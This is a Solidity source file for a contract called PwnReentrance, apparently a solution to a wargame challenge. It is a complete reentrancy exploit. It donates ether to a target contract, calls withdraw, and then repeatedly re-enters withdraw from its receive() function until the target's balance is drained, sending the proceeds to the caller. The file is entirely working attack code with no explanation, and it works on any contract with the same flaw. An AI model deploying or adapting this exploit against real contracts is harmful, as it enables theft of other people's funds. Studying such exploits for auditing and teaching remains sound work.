// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnReentrance {
    function pwn(address target) external payable {
        require(msg.value > 0, "Must send some ether");
        (bool success,) = target.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success);
        (success,) = target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        require(success);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender.balance >= msg.value) {
            (bool success,) = msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
            require(success);
        }
    }
}
